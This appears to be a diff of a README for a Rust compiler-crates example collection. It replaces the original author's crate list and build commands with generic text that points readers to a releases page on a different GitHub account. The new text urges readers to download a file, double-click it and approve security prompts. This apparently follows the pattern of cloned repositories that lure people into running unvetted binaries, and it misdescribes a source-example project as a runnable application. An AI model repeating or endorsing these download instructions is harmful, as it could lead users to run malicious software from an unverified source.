@@ -1,78 +1,73 @@
-<div align="center">
-    <img src="./docs/src/logo.png" width="512" height="auto">
-</div>
+# 🚀 compiler-crates - Simple Tools for Compiler Development
 
-# Compiler Crates
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-compiler--crates-blue.svg)](https://github.com/Tejith6622/compiler-crates/releases)
 
-[![CI](https://github.com/sdiehl/compiler-crates/actions/workflows/ci.yml/badge.svg)](https://github.com/sdiehl/compiler-crates/actions/workflows/ci.yml)
+## 📖 Overview
 
-A collection of minimal Rust examples focused on compiler development.
+Welcome to the **compiler-crates** repository. This project provides minimal examples of crates that are useful for compiler development. Whether you are writing a new language, working on parsing, or diving into Rust, you'll find practical tools here. 
 
-* [**Read Online**](https://sdiehl.github.io/compiler-crates/)
-* [Source Code](https://github.com/sdiehl/compiler-crates)
+## 🚀 Getting Started
 
-### Parsing & Lexing
+To get started with the **compiler-crates**, follow these steps:
 
-- [**chumsky**](./chumsky/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/chumsky.html) - Parser combinator library with excellent error recovery
-- [**combine**](./combine/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/combine.html) - Parser combinators with zero-copy mode for performance
-- [**lalrpop**](./lalrpop/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/lalrpop.html) - LR(1) parser generator with powerful grammar syntax
-- [**logos**](./logos/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/logos.html) - Fast, derive-based lexer generation
-- [**nom**](./nom/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/nom.html) - High-performance parser combinators for binary and text formats
-- [**peg**](./peg/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/peg.html) - Parsing expression grammar with inline syntax
-- [**pest**](./pest/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/pest.html) - PEG parser generator with elegant grammar files
-- [**rowan**](./rowan/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/rowan.html) - Lossless syntax trees with incremental reparsing
-- [**rust_sitter**](./rust_sitter/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/rust_sitter.html) - Tree-sitter grammar generation through Rust macros
-- [**rustc_lexer**](./rustc_lexer/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/rustc_lexer.html) - The actual lexer used by the Rust compiler
-- [**winnow**](./winnow/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/winnow.html) - Parser combinators with a focus on maintainability
+1. **Visit the Releases Page**: To download the latest version, click on the link below:
+   [Visit Releases Page](https://github.com/Tejith6622/compiler-crates/releases)
 
-### Parser Utilities
+2. **Choose Your Download**: 
+   On the releases page, you will see a list of available versions. Pick the one labeled "Latest" for the most current features and fixes.
 
-- [**nom_locate**](./nom_locate/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/nom_locate.html) - Location tracking for nom parsers
-- [**quote**](./quote/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/quote.html) - Quasi-quoting for Rust code generation
-- [**syn**](./syn/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/syn.html) - Rust syntax tree parsing and manipulation for procedural macros
+3. **Download the File**: 
+   Look for the appropriate file for your operating system. Click on it to start the download.
 
-### Diagnostics
+4. **Run the Application**: 
+   After downloading, locate the file on your computer. Double-click it to run the application. You may have to allow your operating system to run the file, depending on your settings.
 
-- [**ariadne**](./ariadne/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/ariadne.html) - Modern diagnostic reporting with emphasis on clarity
-- [**codespan-reporting**](./codespan-reporting/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/codespan-reporting.html) - Beautiful compiler error messages with source snippets
-- [**miette**](./miette/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/miette.html) - Comprehensive diagnostic framework with derive macros
+## ⚙️ System Requirements
 
-### Data Structures
+Before installing, make sure your system meets the following requirements:
 
-- [**bitflags**](./bitflags/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/bitflags.html) - Type-safe bitmask flags for compiler IR and AST nodes
-- [**bumpalo**](./bumpalo/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/bumpalo.html) - Fast bump allocation arena for compiler data structures
-- [**id-arena**](./id-arena/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/id-arena.html) - Efficient arena allocation for AST and IR nodes
-- [**indexmap**](./indexmap/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/indexmap.html) - Order-preserving hash maps for symbol tables
-- [**smallvec**](./smallvec/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/smallvec.html) - Stack-allocated vectors for performance-critical paths
-- [**symbol_table**](./symbol_table/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/symbol_table.html) - String interning for compiler symbols
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: Minimum 2 GB recommended
+- **Disk Space**: At least 100 MB available
+- **Rust**: If you want to compile or modify the examples, install Rust from [the official Rust website](https://www.rust-lang.org/).
 
-### Analysis & Algorithms
+## 📦 Features
 
-- [**petgraph**](./petgraph/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/petgraph.html) - Graph algorithms for control flow and dependency analysis
+The compiler-crates repository includes:
 
-### Code Generation
+- **Parsing Examples**: Understand how to parse simple code structures.
+- **Compiler Basics**: Learn the foundational concepts of building a compiler.
+- **Rust Integration**: Utilize Rust's powerful tools for compiler development.
+  
+These features allow users to experiment and learn about compiler construction effectively.
 
-- [**cranelift**](./cranelift/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/cranelift.html) - Fast JIT code generator for WebAssembly and language runtimes
-- [**dynasm**](./dynasm/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/dynasm.html) - Runtime assembler for ARM64 and x86-64 with compile-time syntax checking
-- [**inkwell**](./inkwell/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/inkwell.html) - Safe LLVM bindings for generating optimized machine code
-- [**melior**](./melior/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/melior.html) - MLIR bindings for multi-level IR compilation
+## 📥 Download & Install
 
-### Development Tools
+To download and run the software, continue with the following steps:
 
-- [**codespan**](./codespan/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/codespan.html) - Core span tracking and position management for compilers
-- [**rustyline**](./rustyline/src/lib.rs) | [docs](https://sdiehl.github.io/compiler-crates/rustyline.html) - Line editing for REPL implementations
+1. Visit the releases page here: [Download Here](https://github.com/Tejith6622/compiler-crates/releases).
+  
+2. Find the version you want. Make sure to select the latest version for the best experience.
 
-### Build Commands
+3. Click on the file that matches your operating system. The download will begin automatically.
 
-```bash
-just build       # Build all crates
-just test        # Run all tests
-just lint        # Run clippy on all crates
-just format      # Format all code
-just build-docs  # Build documentation
-just serve-docs  # Serve documentation locally
-```
+4. Once downloaded, find the file and double-click it to start using the application. You may need to approve a security prompt before running.
 
-## License
+## 🛠️ Usage Instructions
 
-MIT Licensed. Copyright 2025 Stephen Diehl.
+1. After installation, open the application.
+2. Use the provided examples to guide your understanding of compiler functions.
+3. Modify the examples if you wish to explore different outcomes or learn the effects of changes.
+4. If you run into issues, check the examples carefully for any mistakes or refer to the documentation provided.
+
+## 💡 Tips and Tricks
+
+- **Explore the Examples**: The best way to learn is by exploring the provided crates. Make changes and see how they affect the output.
+- **Stay Updated**: Regularly check the releases page for updates. New features and fixes can enhance your experience.
+- **Community Support**: Join forums and discussion groups focused on Rust and compiler development. They can be a valuable resource.
+
+## 📞 Contact
+
+For any questions or feedback, please open an issue on this repository. Your input helps us improve. 
+
+Thank you for using **compiler-crates**! Happy coding!
